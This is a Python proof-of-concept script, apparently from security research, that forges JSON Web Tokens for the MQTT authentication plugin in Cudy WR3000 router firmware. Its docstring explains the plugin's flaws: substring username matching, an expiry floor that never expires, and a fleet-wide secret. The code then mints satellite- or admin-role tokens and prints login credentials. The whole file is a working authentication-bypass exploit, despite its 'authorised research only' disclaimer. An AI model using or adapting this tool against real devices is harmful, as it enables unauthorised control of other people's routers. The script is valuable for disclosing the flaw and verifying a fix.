#!/usr/bin/env python3
"""
forge_jwt.py - mint a token that Cudy's auth_plugin_jwt.so accepts.

The plugin (mosquitto_auth_unpwd_check @ 0x3318 in firmware 2.4.15) checks:
  1. MQTT username contains the bdinfo deviceid (cudydevice)  (strstr)
  2. password verifies as HS256/384/512 JWT signed with bdinfo "secret"
  3. "exp" grant >= 1577826000  (a fixed floor; never compared to now)
  4. "username" grant contains the bdinfo deviceid              (strstr)
It then returns SUCCESS. acl_check() returns MOSQ_ERR_PLUGIN_DEFER (17), so
the broker's /etc/mosquitto/aclfile.conf is enforced. The ACL usernames are
exact: "cudydevice" (satellite) and "admincudydevice" (admin).

Usage:
    python3 forge_jwt.py --deviceid cudydevice --role satellite --secret '<secret from bdinfo>'
    python3 forge_jwt.py --deviceid cudydevice --role admin --secret '<secret>'
    python3 forge_jwt.py --demo        # placeholder values, shows the shape

Requires: pyjwt  (pip install pyjwt)
Authorised research only - this exists to demonstrate the flaw, not to
attack devices you do not own.
"""
import argparse
import base64
import json

EXP_FLOOR = 1577826000          # 2019-12-31T21:00:00Z, hard-coded in the plugin
DEFAULT_EXP = 1999999999        # 2033 - anything above the floor works, forever
ROLES = {"satellite": "cudydevice", "admin": "admincudydevice"}


def b64url(seg: bytes) -> str:
    return base64.urlsafe_b64encode(seg).rstrip(b"=").decode()


def forge(deviceid: str, secret: str, exp: int = DEFAULT_EXP,
          username: str | None = None) -> str:
    """Mint an HS256 token; username defaults to the bdinfo deviceid."""
    import jwt
    if username is None:
        username = deviceid
    if deviceid not in username:
        raise ValueError(f"username {username!r} must contain the bdinfo deviceid {deviceid!r}")
    payload = {"exp": exp, "username": username}
    return jwt.encode(payload, secret, algorithm="HS256")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[1])
    ap.add_argument("--deviceid", default="cudydevice",
                    help="bdinfo deviceid the plugin checks for (default cudydevice)")
    ap.add_argument("--role", choices=tuple(ROLES), default="satellite",
                    help="ACL role; sets the exact MQTT username")
    ap.add_argument("--username", help="override the exact ACL username (must contain --deviceid)")
    ap.add_argument("--secret", help="bdinfo 'secret' value (the HMAC key)")
    ap.add_argument("--exp", type=int, default=DEFAULT_EXP)
    ap.add_argument("--demo", action="store_true",
                    help="use a placeholder secret and verify round-trip")
    args = ap.parse_args()

    secret = args.secret or "PLACEHOLDER-SECRET-FOR-DEMO"
    if not args.secret and not args.demo:
        print("[!] no --secret given; using placeholder (demo mode)")
    username = args.username or ROLES[args.role]
    try:
        token = forge(args.deviceid, secret, args.exp, username=username)
    except ValueError as exc:
        raise SystemExit(f"[!] {exc}")
    print(f"[+] token:\n{token}\n")

    hdr_b64, pl_b64, sig_b64 = token.split(".")
    print("header  :", json.loads(base64.urlsafe_b64decode(hdr_b64 + "==")))
    print("payload :", json.loads(base64.urlsafe_b64decode(pl_b64 + "==")))

    import jwt
    verified = jwt.decode(token, secret, algorithms=["HS256"])
    ok_exp = verified["exp"] >= EXP_FLOOR
    ok_user = args.deviceid in verified["username"]
    print("[+] self-verify HS256: OK")
    print(f"[+] exp {verified['exp']} >= floor {EXP_FLOOR}: {'OK' if ok_exp else 'FAIL'}")
    print(f"[+] username grant contains deviceid: {'OK' if ok_user else 'FAIL'}")
    if ok_exp and ok_user:
        print("\n[*] MQTT usage:  username = %r  password = <token>  role = %s"
              % (username, args.role))
        print("[*] the same token authenticates against any WR3000 2.0 node that")
        print("    shares the secret (fleet-wide key).")


if __name__ == "__main__":
    main()
